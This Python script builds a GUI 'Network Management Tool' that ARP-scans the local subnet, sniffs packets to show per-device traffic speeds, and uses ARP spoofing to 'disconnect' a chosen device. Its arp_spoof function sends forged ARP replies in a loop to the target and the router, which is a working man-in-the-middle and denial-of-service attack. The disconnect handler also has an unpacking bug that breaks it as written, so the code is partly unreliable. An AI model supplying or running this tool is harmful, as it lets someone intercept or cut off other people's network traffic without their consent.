import os
import sys
import tkinter as tk
from tkinter import messagebox, ttk
import psutil
from scapy.all import ARP, Ether, srp, send, sniff, IP, conf
import ctypes
import socket
import ipaddress
import threading
import time


# Check for administrative privileges
def check_admin():
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin


# Prompt for admin privileges
def run_as_admin():
    if sys.platform == 'win32':
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    else:
        print("Please run this script with sudo.")
        sys.exit()


# Get the IP address of the selected network interface
def get_interface_ip(interface):
    addrs = psutil.net_if_addrs()
    for addr in addrs[interface]:
        if addr.family == socket.AF_INET:
            return addr.address
    return None


# Get the MAC address of a given IP
def get_mac(ip, interface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, iface=interface, verbose=False)
    for sent, received in ans:
        return received.hwsrc
    return None


# Monitor network traffic for each device
class TrafficMonitor:
    def __init__(self, interface, update_interval=2):  # Increase update interval
        self.interface = interface
        self.update_interval = update_interval
        self.devices = {}
        self.start_time = time.time()
        self.lock = threading.Lock()

    def add_device(self, ip, mac):
        with self.lock:
            self.devices[ip] = {"mac": mac, "upload": 0, "download": 0, "last_upload": 0, "last_download": 0,
                                "upload_speed": 0, "download_speed": 0}

    def calculate_speeds(self):
        while True:
            time.sleep(self.update_interval)
            current_time = time.time()
            interval = current_time - self.start_time
            self.start_time = current_time

            with self.lock:
                for ip, data in self.devices.items():
                    upload_speed = (data["upload"] - data["last_upload"]) / interval
                    download_speed = (data["download"] - data["last_download"]) / interval
                    data["last_upload"] = data["upload"]
                    data["last_download"] = data["download"]
                    data["upload_speed"] = upload_speed / 1024  # Convert to KB/s
                    data["download_speed"] = download_speed / 1024  # Convert to KB/s
                    print(
                        f"IP: {ip} | Upload Speed: {data['upload_speed']} KB/s | Download Speed: {data['download_speed']} KB/s")

    def process_packet(self, packet):
        if packet.haslayer(IP):
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            packet_size = len(packet)

            with self.lock:
                if src_ip in self.devices:
                    self.devices[src_ip]["upload"] += packet_size
                    print(f"Processed upload packet: {src_ip} | Size: {packet_size}")

                if dst_ip in self.devices:
                    self.devices[dst_ip]["download"] += packet_size
                    print(f"Processed download packet: {dst_ip} | Size: {packet_size}")

    def start(self):
        threading.Thread(target=self.calculate_speeds, daemon=True).start()
        sniff(prn=self.process_packet, store=0, iface=self.interface, filter="ip")


# GUI Class
class NetworkManagerApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Network Management Tool")
        self.geometry("1000x600")
        self.traffic_monitor = None
        self.network_interface = None
        self.router_ip = None
        self.router_mac = None
        self.create_widgets()

    def create_widgets(self):
        frame = ttk.Frame(self, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)

        self.interface_label = ttk.Label(frame, text="Select Network Interface:")
        self.interface_label.grid(column=0, row=0, padx=5, pady=5, sticky=tk.W)

        self.interface_combobox = ttk.Combobox(frame)
        self.interface_combobox.grid(column=1, row=0, padx=5, pady=5, sticky=tk.EW)

        self.scan_button = ttk.Button(frame, text="Scan Network", command=self.scan_network)
        self.scan_button.grid(column=2, row=0, padx=5, pady=5, sticky=tk.E)

        self.devices_treeview = ttk.Treeview(frame, columns=(
        "IP Address", "MAC Address", "Download Speed (KB/s)", "Upload Speed (KB/s)"), show='headings')
        self.devices_treeview.heading("IP Address", text="IP Address")
        self.devices_treeview.heading("MAC Address", text="MAC Address")
        self.devices_treeview.heading("Download Speed (KB/s)", text="Download Speed (KB/s)")
        self.devices_treeview.heading("Upload Speed (KB/s)", text="Upload Speed (KB/s)")
        self.devices_treeview.grid(column=0, row=1, columnspan=3, padx=5, pady=5, sticky=tk.NSEW)

        self.disconnect_button = ttk.Button(frame, text="Disconnect Device", command=self.disconnect_device)
        self.disconnect_button.grid(column=0, row=2, columnspan=3, padx=5, pady=5, sticky=tk.E)

        frame.columnconfigure(1, weight=1)
        frame.rowconfigure(1, weight=1)

        self.list_network_interfaces()
        self.update_speeds()

    def list_network_interfaces(self):
        print("Listing network interfaces...")
        interfaces = psutil.net_if_addrs()
        interface_names = [interface for interface in interfaces]
        self.interface_combobox['values'] = interface_names
        if interface_names:
            self.interface_combobox.current(0)
        print(f"Available interfaces: {interface_names}")

    def scan_network(self):
        selected_interface = self.interface_combobox.get()
        print(f"Selected interface: {selected_interface}")
        if selected_interface:
            self.network_interface = selected_interface
            self.devices_treeview.delete(*self.devices_treeview.get_children())

            interface_ip = get_interface_ip(selected_interface)
            print(f"Interface IP: {interface_ip}")
            if interface_ip:
                subnet = ipaddress.ip_network(interface_ip + '/24', strict=False)
                self.router_ip = str(subnet.network_address + 1)
                self.router_mac = get_mac(self.router_ip, selected_interface)
                print(f"Router IP: {self.router_ip}, Router MAC: {self.router_mac}")
                devices = self.arp_scan(selected_interface, str(subnet))
                self.traffic_monitor = TrafficMonitor(selected_interface)
                for ip, mac in devices.items():
                    self.traffic_monitor.add_device(ip, mac)
                    self.devices_treeview.insert("", tk.END, values=(ip, mac, "0", "0"))
                print(f"Devices found: {devices}")
                threading.Thread(target=self.traffic_monitor.start, daemon=True).start()
            else:
                messagebox.showerror("Error", "Could not determine the IP address of the selected interface.")

    def arp_scan(self, interface, subnet):
        print(f"Starting ARP scan on interface {interface} for subnet {subnet}...")
        arp_request = ARP(pdst=subnet)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, iface=interface, timeout=1, verbose=False)[0]

        devices = {}
        for element in answered_list:
            devices[element[1].psrc] = element[1].hwsrc

        print(f"ARP scan completed. Devices: {devices}")
        return devices

    def disconnect_device(self):
        selected_item = self.devices_treeview.selection()
        if selected_item:
            item = self.devices_treeview.item(selected_item)
            ip, mac = item["values"]
            print(f"Disconnecting device: IP={ip}, MAC={mac}")
            self.arp_spoof(ip, mac, self.router_ip, self.router_mac)

    def arp_spoof(self, target_ip, target_mac, router_ip, router_mac):
        print(
            f"Starting ARP spoofing: Target IP={target_ip}, Target MAC={target_mac}, Router IP={router_ip}, Router MAC={router_mac}")

        def send_spoof():
            while True:
                # Tell the target that we are the router
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip), verbose=False)
                # Tell the router that we are the target
                send(ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip), verbose=False)
                print(f"Sent ARP spoof packets to {target_ip} and {router_ip}")
                time.sleep(2)

        thread = threading.Thread(target=send_spoof)
        thread.daemon = True
        thread.start()
        print("ARP spoofing thread started.")

    def update_speeds(self):
        if self.traffic_monitor:
            for item in self.devices_treeview.get_children():
                ip, mac, _, _ = self.devices_treeview.item(item, 'values')
                with self.traffic_monitor.lock:
                    if ip in self.traffic_monitor.devices:
                        upload_speed = self.traffic_monitor.devices[ip].get("upload_speed", 0)
                        download_speed = self.traffic_monitor.devices[ip].get("download_speed", 0)
                        self.devices_treeview.item(item,
                                                   values=(ip, mac, f"{download_speed:.2f}", f"{upload_speed:.2f}"))
        self.after(1000, self.update_speeds)


if __name__ == "__main__":
    if not check_admin():
        run_as_admin()

    app = NetworkManagerApp()
    app.mainloop()
